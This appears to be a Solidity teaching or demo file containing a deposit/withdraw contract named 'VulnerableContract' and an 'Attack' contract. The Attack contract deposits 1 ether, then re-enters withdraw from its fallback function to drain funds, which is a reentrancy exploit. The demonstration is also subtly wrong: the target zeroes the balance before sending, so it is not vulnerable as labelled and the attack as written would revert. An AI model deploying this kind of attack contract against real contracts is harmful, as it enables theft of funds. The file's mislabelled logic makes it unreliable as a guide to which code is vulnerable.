// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
 
contract VulnerableContract {
    mapping(address => uint) public balance;
 
    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }
 
    function withdraw() public{
     uint bal = balance[msg.sender];
    require(bal >0,"Your balance is equal to zero");
 balance[msg.sender] = 0;
  (bool sent,) =  msg.sender.call{value: bal}("");
  require(sent,"Transfer did not go through");
  }
  
}
 
 
contract Attack{
    VulnerableContract public etherStore;
  uint constant public AMOUNT = 1 ether;
 
  constructor(address _vulnerableContractAdress) {
  etherStore = VulnerableContract(_vulnerableContractAdress);
 
  }
 
  //create a fallback function
  fallback() external payable {
    if (address(etherStore).balance >= AMOUNT) {
        etherStore.withdraw();
    }
  }
 
  function attack() external payable  {
    require(msg.value >= AMOUNT);
    etherStore.deposit{value: AMOUNT}();
    etherStore.withdraw();
  }
 
}